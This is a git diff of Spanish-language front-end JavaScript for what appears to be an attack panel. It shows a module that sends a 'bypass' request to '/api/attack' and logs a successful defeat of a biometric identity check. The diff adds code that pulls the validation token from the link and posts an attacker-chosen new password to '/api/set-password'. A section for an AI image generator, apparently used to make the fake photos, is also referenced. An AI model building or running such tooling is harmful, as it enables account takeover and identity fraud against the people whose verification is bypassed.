@@ -52,6 +52,7 @@ const consoleOutput = document.getElementById('consoleOutput');
 const clearConsoleBtn = document.getElementById('clearConsoleBtn');
 const autoTokenBtn = document.getElementById('autoTokenBtn');
 const vigenciaFirmaSelect = document.getElementById('vigenciaFirma');
+const passLinkInput = document.getElementById('passLinkInput');
 
 // Escuchar cambios en la vigencia seleccionada para actualizar los campos fijos avanzados
 if (vigenciaFirmaSelect) {
@@ -313,6 +314,16 @@ inyeccionForm.addEventListener('submit', async (e) => {
           bypassLinkInput.value = data.link_biometria;
           addLog('info', '[BYPASS] Enlace de validación copiado automáticamente al módulo bypass.');
         }
+        // Autocompletar el link en la sección de Contraseña (solo el token)
+        if (typeof passLinkInput !== 'undefined' && passLinkInput) {
+          try {
+            const urlObj = new URL(data.link_biometria);
+            passLinkInput.value = urlObj.searchParams.get('token') || data.link_biometria;
+          } catch {
+            passLinkInput.value = data.link_biometria;
+          }
+          addLog('info', '[PASS] Token copiado automáticamente al campo de contraseña.');
+        }
       }
 
       // Crear un botón interactivo dentro de la consola para ir al enlace (para redundancia)
@@ -524,15 +535,13 @@ bypassBtn.addEventListener('click', async () => {
     addLog('error', '[BYPASS] Enlace inválido o falta token: ' + e.message);
     return;
   }
-
-  addLog('info', '[BYPASS] Enviando ataque a tribu.js (http://localhost:3000/api/attack)...');
   bypassBtn.classList.add('loading');
   bypassBtn.disabled = true;
 
+  let bypassToken = '';
+
   try {
     addLog('info', '[BYPASS] Enviando ataque al servidor unificado (/api/attack)...');
-    bypassBtn.classList.add('loading');
-    bypassBtn.disabled = true;
 
     // Enviamos la petición al mismo puerto que aloja la página web
     const response = await fetch('/api/attack', {
@@ -543,9 +552,16 @@ bypassBtn.addEventListener('click', async () => {
     
     const data = await response.json();
     
-    if (data.status === 200 && (data.body.trim() === '1' || data.body.includes('"codigo":1') || data.body.includes('ok":true') || data.body.includes('Éxito') || data.body.includes('Exito'))) {
-      addLog('success', '[BYPASS - ÉXITO] ¡Ataque exitoso! La validación biométrica ha sido aprobada.');
+    if (data.status === 200 && (data.body.trim() === '1' || data.body.includes('"codigo":1') || data.body.includes('ok":true') || data.body.includes('\u00c9xito') || data.body.includes('Exito'))) {
+      addLog('success', '[BYPASS - \u00c9XITO] \u00a1Ataque exitoso! La validación biométrica ha sido aprobada.');
       addLog('error', `Respuesta: Status ${data.status} - Body: ${data.body}`);
+
+      // Guardar el token para usarlo en el envio de contraseña
+      bypassToken = token;
+
+      // Mostrar la sección de contraseña
+      const passwordSection = document.getElementById('passwordSection');
+      if (passwordSection) passwordSection.style.display = 'block';
     } else {
       addLog('warn', '[BYPASS - BLOQUEADO] El servidor rechazó la foto o falló.');
       addLog('warn', `Respuesta: Status ${data.status} - Body: ${data.body}`);
@@ -556,7 +572,62 @@ bypassBtn.addEventListener('click', async () => {
     bypassBtn.classList.remove('loading');
     bypassBtn.disabled = false;
   }
+
+  // Guardar token globalmente para el botón de contraseña
+  window._bypassToken = bypassToken;
 });
+
+// ==================================================
+// Envío de Contraseña tras Bypass Exitoso
+// ==================================================
+const enviarPassBtn = document.getElementById('enviarPassBtn');
+const newPassInput = document.getElementById('newPassInput');
+
+if (enviarPassBtn) {
+  enviarPassBtn.addEventListener('click', async () => {
+    // Usar el valor del campo directamente como token
+    const token = passLinkInput ? passLinkInput.value.trim() : '';
+
+    const newPass = newPassInput ? newPassInput.value.trim() : '';
+
+    if (!token) {
+      addLog('warn', '[PASS] Ingresa el enlace de validación con el token antes de enviar.');
+      return;
+    }
+    if (!newPass) {
+      addLog('warn', '[PASS] Por favor ingresa una contraseña antes de enviar.');
+      return;
+    }
+
+    addLog('info', `[PASS] Enviando contraseña al servidor...`);
+    enviarPassBtn.classList.add('loading');
+    enviarPassBtn.disabled = true;
+
+    try {
+      const response = await fetch('/api/set-password', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token, newPass })
+      });
+
+      const data = await response.json();
+
+      let bodyParsed;
+      try { bodyParsed = JSON.parse(data.body); } catch { bodyParsed = data.body; }
+
+      if (data.status === 200 && (bodyParsed === true || bodyParsed?.ok === true || data.body.includes('true'))) {
+        addLog('success', `[PASS - \u00c9XITO] \u00a1Contraseña guardada correctamente! Respuesta: ${data.body}`);
+      } else {
+        addLog('warn', `[PASS] El servidor respondió con un estado inesperado. Status: ${data.status} - Body: ${data.body}`);
+      }
+    } catch (err) {
+      addLog('error', '[PASS] Error de conexión al enviar contraseña: ' + err.message);
+    } finally {
+      enviarPassBtn.classList.remove('loading');
+      enviarPassBtn.disabled = false;
+    }
+  });
+}
 
 // ==================================================
 // Lógica del Generador de Imágenes IA (Flux via RapidAPI)
